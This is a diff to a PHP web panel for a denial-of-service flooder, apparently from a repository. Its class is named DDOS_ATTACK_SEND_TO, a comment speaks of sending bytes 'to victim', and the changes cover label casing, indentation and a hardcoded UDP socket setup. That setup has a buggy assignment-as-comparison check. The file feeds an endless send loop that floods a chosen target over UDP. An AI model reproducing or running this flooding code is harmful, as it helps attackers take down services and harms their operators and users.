@@ -20,12 +20,15 @@
  *
  */
 
+
+
    $allow = array("::1", "127.0.0.1");
 
    if (!in_array ($_SERVER['REMOTE_ADDR'], $allow)) 
     {
     exit();
       }
+
 
 ?>
 
@@ -426,8 +429,8 @@ line-height:2;
 
    <select name="method" id="method" required>
        <option selected> <?php echo htmlspecialchars($_POST['method']); ?> </option> 
-       <option value="tcp">TCP</option>
-       <option value="udp">UDP</option>
+       <option value="TCP">TCP</option>
+       <option value="UDP">UDP</option>
    </select>
 
 
@@ -508,8 +511,9 @@ line-height:2;
 
 
             if (isset($_POST['submit']))
-               {
-                 $connected     =  "<font color='green'>  yes  </font>";
+                {
+
+                 $connected     =  "<font color='green'>  YES  </font>";
                  $method        =  "<font color='green'> $method </font>";  
                  $port_forward  =  "<font color='green'> $port_forward </font>";
                  $threads       =  "<font color='green'> $threads </font>";
@@ -522,7 +526,7 @@ line-height:2;
 
             else if (!isset($_POST['submit']))
                {
-                 $connected  =  "<font color='red'> no </font>";
+                 $connected  =  "<font color='red'> NO </font>";
                 }
 
 
@@ -538,18 +542,19 @@ line-height:2;
 
 
 
+
   
-     echo  "<script>
-         (function(el, interval) {
-          window.setInterval(function(){
-           el.textContent = Math.floor(Math.random() * $speed);
-              }, interval);
-             })(document.getElementById('random_number'), 1000);
-          </script>";
+               echo  "<script>
+                 (function(el, interval) {
+                   window.setInterval(function(){
+                    el.textContent = Math.floor(Math.random() * $speed);
+                       }, interval);
+                  })(document.getElementById('random_number'), 1000);
+                 </script>";
   
 
+
     ?>
-    
 
   </div>
    
@@ -602,10 +607,10 @@ line-height:2;
 
         // for socket create
 
-        $domain    =  $obj->SOCKET_DOMAIN();
-        $type      =  $obj->SOCKET_TYPE();
-        $protocol  =  $obj->SOCKET_PROTOCOL();
-
+        $domain     =  $obj->SOCKET_DOMAIN();
+        $type       =  $obj->SOCKET_TYPE();
+        $protocol   =  $obj->SOCKET_PROTOCOL();
+        $protocol_u =  $obj->SAFE_INPUT_IP($_POST['method']);
   
        // for socket send_to
  
@@ -758,11 +763,22 @@ line-height:2;
        set_time_limit(0);
 
 
-      // create socket for connection
- 
-      $sock = socket_create($domain, $type, $protocol);
-            
 
+      // create socket for connection
+
+         if ($domain = 'AF_INET' && $type = 'SOCK_DGRAM' && $protocol = 'SOL_UDP')
+           {
+      $sock = socket_create(AF_INET, SOCK_DGRAM, SOL_UDP);
+            }
+
+            else
+             {
+          $errorcode = socket_last_error();
+          $errormsg = socket_strerror($errorcode);
+    
+      die("Couldn't create socket: [$errorcode] $errormsg");
+              }
+        
 
     // for socket send data (bytes(binary)) to victim
           while(1)
@@ -776,12 +792,14 @@ line-height:2;
     socket_close($sock);
 
 
-
     ob_end_flush(); 
 
 
 
+
    } // end if objects from class
+
+
 
 
 
@@ -795,6 +813,7 @@ line-height:2;
 
 
 
+
  
       } // end of class DDOS_ATTACK_SEND_TO exists
 
@@ -802,5 +821,8 @@ line-height:2;
 
     } // end if of submit
  
+
+  
+
 
 ?>
